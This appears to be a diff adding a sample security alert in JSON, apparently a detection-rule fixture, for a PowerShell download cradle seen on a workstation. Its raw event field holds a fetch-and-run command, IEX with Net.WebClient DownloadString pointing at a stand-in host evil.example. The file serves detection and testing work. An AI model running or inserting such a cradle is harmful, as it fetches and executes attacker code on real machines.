@@ -1,0 +1,14 @@
+{
+  "_time": "1745796600",
+  "_raw": "EventCode=4104 ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')",
+  "search_name": "Endpoint - PowerShell Encoded Download Cradle - Rule",
+  "signature": "PowerShell IEX download cradle observed",
+  "urgency": "high",
+  "src": "wks-carol-12",
+  "src_ip": "10.0.5.99",
+  "user": "CORP\\carol",
+  "annotations": {
+    "mitre_attack": ["T1059.001", "T1105"]
+  },
+  "rid": "ES-RULE-ENDPOINT-019"
+}
